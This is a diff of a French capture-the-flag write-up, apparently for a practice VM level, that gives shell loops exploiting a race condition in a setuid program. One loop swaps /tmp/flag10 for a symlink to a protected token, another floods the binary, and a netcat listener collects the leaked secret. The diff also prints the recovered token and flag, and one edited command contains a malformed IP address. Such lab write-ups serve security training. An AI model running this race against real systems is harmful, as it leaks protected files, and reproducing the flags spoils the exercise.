@@ -16,36 +16,18 @@ puts : used to write a line or string to the output( stdout ) stream. It prints 
 
 dans un terminal avec ssh ouvert sur la vm creer ce script dolink
 il va supprimer si ca existe et recreer un lien symbolique entre token et tmpflag10
-#!/bin/sh
-while [1]
-do 
-	rm -rf /tmp/flag10
-	touch /tmp/flag10
-	rm -rf /tmp/flag10
-	ln -s /token /tmp/flag10
-done
+
+while true; do rm -rf /tmp/flag10; touch /tmp/flag10; rm -rf /tmp/flag10; ln -s ~/token /tmp/flag10; done
 
 dans un autre terminal avec ssh ouvert sur la vm creer ce script uselink
-la c'est juste bourrin, il va forcer la connexion pour qu'il y en ait une qui passe entre le moment ou ca check le fichier et le moment ou ca check la connexion, il y en a toujours au moins 1/5 qui passe
-#!/bin/sh
-while [1]
-do 
-	./level10 /tmp/flag10 192.168.56.101
-done
+il va forcer la connexion pour qu'il y en ait une qui passe entre le moment ou ca check le fichier et le moment ou ca check la connexion
+
+while true; do ~/level10 /tmp/flag10 192.168.56.(101); done
 
 la ligne qui suit, a effectuer dans 1 3eme terminal, permet de lire la sortie d'avant, et donc recuperer le flag, pour avoir le getflag
 nc -kl 6969
 
-
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
+code : woupa2yuojeeaaed06riuj63c
 
 ---
 ## Flag : feulo4b72j7edeahuete3no7c
